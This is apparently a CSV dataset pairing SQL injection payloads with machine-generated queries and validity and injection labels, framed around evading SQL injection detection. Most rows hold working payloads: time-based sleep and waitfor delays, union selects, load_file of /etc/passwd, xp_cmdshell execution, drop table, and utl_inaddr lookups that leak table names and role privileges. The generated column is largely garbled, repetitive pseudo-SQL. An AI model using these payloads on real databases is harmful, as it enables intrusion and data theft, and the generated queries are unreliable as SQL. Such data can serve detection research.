original_query,generated_query,validity,is_sqli
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection' FROM query: 1'|| WHERE NOT SELECT 'agng' FROM SQL injection detection,1,0
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',SELECT MIN(3020 = 3020) FROM SQL injection,1,1
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,SELECT DISTINCT (SQL injection) FROM SQL ORDER BY COUNT(*) DESC,1,0
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",SELECT MIN(sql injection) FROM SQL_injection,1,0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,"SELECT pg_sleep ( 5 ) FROM query: SELECT pg_sleep, 'rpka' FROM query: SELECT pg_sleep, 'rpka' FROM query: SELECT pg_sleep ( 5 ) FROM query: SELECT pg_sleep, 'rpka' FROM query: SELECT pg_sleep, 'rpka' FROM SELECT SUM((CASE WHEN NOT pg_sleep = 'rpka' AND rpka = 'rpka'",1,1
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,0
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb","SELECT MIN(""witb"") FROM SQL injection",1,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",SELECT * FROM SQL_users WHERE NOT all_users IN (SELECT all_users FROM SQL injection),1,1
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:20'%20/*) FROM SQL injection,1,1
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg","SELECT MIN(1210 = 1210,sleep ( 5 ) FROM SQL injection detection) FROM SQL injection",1,1
"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE 6468,6468 = 7999 ORDER BY case LIMIT 1",0,0
if  (  5127  =  2829  )   select 5127 else drop function okos--,SELECT 5127 FROM SQL injection detection,1,0
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection,1,1
" select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",SELECT MIN(*) FROM SQL injection,1,0
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sql injection) FROM SQL WHERE 6039 = 6039 AND 2853 = cast ( (SELECT SUM(2853 = 2853),0,1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,SELECT MIN(sdo ) FROM SQL injection,1,0
bfilename,"SELECT * FROM query: bfilename FROM SQL AS t1 JOIN Query: bfilename FROM query: Query: bfilename = ""valid""",0,0
 or 'whatever' in   (  'whatever'  ) ,SELECT 'evade sq injection detection' FROM SQL SELECT query: or 'whatever' FROM query: or 'whatever',1,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'qtul' like 'qtul,SELECT MIN(SQCH) FROM SQL SELECT MIN(SQCH) FROM SQL INTERSECT SELECT MIN(SQCHr) FROM SQL,1,1
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",SELECT DISTINCT (sql injection) FROM SQL_injection),1,0
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,SELECT MIN(sqgi) FROM SQL JOIN (SELECT SUM(SQL) FROM SQL) AS _executor WHERE 2545 = 2545 OR 4144 = 4144 = (SELECT SUM(SQL) FROM dual) ||chr ( 113 )||chr ( 113 ) ORDER BY SUM(SQL),0,1
" select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE id = '1' + @ 1! union select 1,version ( ) -- 1'",1,1
"1""  )   where 2657  =  2657 and 5309  =  7592--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --","SELECT MIN(sql injection) FROM SQL_Injection WHERE 3232 = 3232 OR make_set (6599 = 5179,5179)",1,1
"1""   )    )     )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection,1,1
1' waitfor delay '0:0:5',SELECT MIN(waitfor delay) FROM SQL injection,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i","SELECT MIN(SELECT) FROM (SELECT SELECT SELECT SELECT FROM sys.all_tables) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_host_address WHERE NOT SELECT = ""utl_inaddr.get_host_address.get_host_address.get_host_address.sql injection"" FROM (SELECT SUM(SELECT, SUM(SELECT, SUM(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT) FROM sys.all_tables) FROM)",0,0
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN cgow's = 1",0,1
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",SELECT MIN(500000000000/2 ) FROM qmkh WHERE NOT qmkh = 'evade sq injection',1,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc","SELECT MIN(s) FROM SQL injection, SELECT 0x71706a71, 'xonc' FROM SQL_Injection'",1,1
"-8869"" where 3019  =  3019 union all select 3019,3019,3019#",SELECT MIN(3019 = 3019 = 3019,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE = 'SYS.LOGINUSER'),1,0
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"' union select 1,load_file('/etc/passwd'),1,1,1;",SELECT MIN(sql injection) FROM SQL_injection,1,0
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT echl FROM SQL - SELECT vwyq FROM SQL,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """,SELECT * FROM SQL_users WHERE NOT all_users IN (SELECT all_users FROM SQL injection),1,1
"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  ""","SELECT MIN(2905 = 5725,5725 ) FROM SQL injection",1,1
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))","SELECT MIN(-3+5,bin(15) FROM SQL_Injection WHERE NOT SELECT SELECT MIN(sql injection) FROM SQL",1,1
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection,1,0
"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 4580 = 4580 AND 4241 = 'convert (int)',1,1
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection,1,0
-8032%'   )    )     )   or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL_injection,1,0
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE '2105 = 2105' OR 4144 = 4144 = (SELECT MIN(selection) FROM SQL),0,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori","SELECT COUNT(*) FROM generate_series WHERE NOT SQL_injection = ""valid""",1,0
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables"" AND NOT domain.domain.tables = ""t3""",1,1
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY SQL_injection,1,0
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '","SELECT MIN( 6272 = 6272,sleep ( 5 ) FROM SQL injection detection",1,1
"-6595"" order by 1--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",SELECT MIN(SQL) FROM SQL SELECT SELECT FROM SQL SELECT,1,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi","SELECT * FROM sysibm.systables as t1,sysibm.systables as t3 INTERSECT SELECT * FROM SQL_INSERT SELECT * FROM sysibm.systables AS t1 JOIN (SELECT * FROM SELECT * FROM sysibm.systables as t2 FROM sysibm.systables as 'evade SQL injection') ORDER BY '%s___systables as t2,sysibm.systables as t3",0,1
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",SELECT MIN(sql injection) FROM SQL_injection WHERE 3522 = 3522,1,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_Injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",SELECT MIN(3702) FROM SQL_injection WHERE NOT char_injection = 'evade SQL injection',1,0
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,"SELECT 6969 FROM pg_sleep WHERE NOT iSQ_injection = ""evade""",1,0
"))) and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL AS T1 JOIN query: 0 = benchmark(3000000,MD5(1))",0,1
"-9504%""   )    )    or 8098  =  7472",SELECT MIN(sql injection) FROM SQL_injection,1,0
1   )    )    as ipfy where 1189  =  1189,"SELECT * FROM query: 1 ) as __chart_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_write_unique = 1189 AND NOT SQL_instructor = ""valid"" AND ipfy = 1189",1,0
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,SELECT MIN(*) FROM SQL injection,1,0
*  (  |  (  objectclass  =  *   )    ) ,SELECT * FROM query: * ( | (objectclass = * ) ORDER BY invalid SQL,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT (SELECT NULL, NULL) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM SQL, invalid = ""sq injection"" ORDER BY NULL",1,1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL,1,1
1'   )    )    as jtmf where 3937  =  3937,SELECT MIN(3937 = 3937) FROM SQL injection,1,1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT * FROM SQL ORDER BY SQL_delay%20'0:0:20'%20-- for,1,1
1%'   )    )     )   union all select null--,SELECT DISTINCT null-- FROM SQL injection,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy","SELECT * FROM (SELECT * FROM query: 'abcdefg, hex ( randomblob ( 500000000000/2 )', 'jwzy' FROM query:'sql injection') AND 'valid' ='sq injection'",1,1
1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',SELECT DISTINCT 'evade SQL injection' FROM SQL_injection' AND 6240 = (SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT ) FROM SQL)) AND NOT (SELECT DISTINCT (((((((((((SELECT SUM(((((((SELECT SQL_injection) FROM rdb$database) ||'qqpjqqqpjq) = 1),1,1
"-2033""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x717a71, 0x717a71, 0x717a767a71, 0x717a71, 0x717a7, 0x717a71, 0x717a71, 0x717a7, 0 FROM SQL injection JOIN (SELECT MIN(4 ) FROM SQL SELECT MIN(sql injection) FROM SELECT 0 FROM SQL SELECT 0 FROM SQL 0x7171706a71, 0x71706a71, 0 FROM SQL SELECT, 0x717a71, 0x71706a71, 0 FROM SQL SELECT, 0x717a71, 0 FROM SQL SELECT, 0x71706a71, 0x717a71, 0x717a71, 0x71706a71, 0x717a71,'sq injection'",1,1
"1""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"-9003""   )    )    union all select 9721,9721--","SELECT 9721,9721-- FROM SQL injection AS _evade_sql injection_detect FROM SELECT 9721,9721-- FROM SQL_Injection",1,1
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SELECT MIN(5000000,md5 ( 0x544d5a4c ) FROM SQL injection",1,1
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,SELECT * FROM query: -2604 ) AS _cb FROM query: -2604 ORDER BY 6897 = 6897,1,1
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz","SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM /SELECT * FROM (SELECT * FROM /SELECT * FROM /SELECT * FROM (SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM /SELECT * FROM (SELECT SUM(SQL_0, SELECT SUM(SELECT * FROM SELECT, SUM(SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT NOT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM SELECT",1,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: '; exec master..xp_cmdshell 'ping 172.10.1.255',1,0
"1%""   )    )    union all select null#",SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",SELECT DISTINCT SUM(SQL) FROM SQL SELECT MIN(SQL) FROM query: 1,1,0
"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:20'%20/*) FROM SQL injection,1,1
1%' rlike sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz","SELECT MIN(*) FROM SQL_injection WHERE NOT rdb$types = 'evade' AND NOT sjiz IN (SELECT sjiz FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4 )",1,1
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",SELECT MIN(excat) FROM SQL injection,1,0
"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT char(5451 = 5451) AND NOT char(5451 = 7232 ORDER BY query_substring",1,1
"1""  )   as wmng where 5976  =  5976",SELECT MIN(sql) FROM SQL injection,1,0
-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf,SELECT MIN(2225 = 8491) FROM SQL injection,1,1
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",SELECT MIN(sql injection) FROM SQL_injection,1,0
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",SELECT -3283 FROM SQL injection AS :__code FROM SQL_INSERT JOIN 1948 = 1948 = 1948 UNION SELECT -3283 FROM SQL_INSERT SELECT -3283 FROM SQL_INSERT SELECT -3283 FROM SQL_INSERT SELECT -3283 FROM SELECT -3283 FROM SQL_INSERT SELECT -3283 FROM 1948 = 1948,0,1
"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--","SELECT MIN(8626,8626,8626,8626-- FROM SQL_Injection AS _evade_injection_method_code WHERE NOT SELECT 8626,8626,8626,8626-- FROM SQL_Injection_Method FROM 8626,8626 WHERE NOT 8626,8626,8626,8626--",1,1
"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'","SELECT MIN(*) FROM SQL injection WHERE 4378 = 4378 OR 4378 = 4378 OR 7552 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT., COUNT(*) FROM SQL injection)",1,1
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",SELECT MIN(sql injection) FROM SQL_injection,1,0
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,"SELECT *4906,'mrxw' FROM SQL injection' ORDER BY 'evade SQL injection'",1,0
' ; drop table temp --,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld",SELECT MIN(success injection) FROM SQL_Injection,1,0
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn",SELECT MIN(*) FROM SQL injection,1,0
1 rlike sleep  (  5  ) ,SELECT * FROM query: 1 rlike sleep ( 5 ) ORDER BY SQL DESC,1,1
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,"SELECT * FROM query: 1 ) AS _1 FROM query: 1 JOIN SQL_inject = ""9588 = 9588 = 9588 rlike sleep ( 5 )""",0,1
ORDER BY SLEEP(5)#,SELECT * FROM SLEEP(5)# FROM query: query: ORDER BY SLEEP(5)#,0,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",SELECT MIN(SELECT) FROM sys.all_tables) FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_inject_host_address WHERE NOT i'='i',0,0
"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SQL injection detection'",1,1
-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,SELECT DISTINCT SUM(SQL) FROM SQL Injection),1,0
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT MIN(*) FROM SQL_Injection WHERE 4817 = 4817 AND t2 = 4817 AND sysibm.systables = ""8189 = (SELECT MIN(*) FROM SQL) AS tecq)",0,1
1'   )    )    as mqnv where 9831  =  9831,SELECT MIN(9831 = 9831,1,1
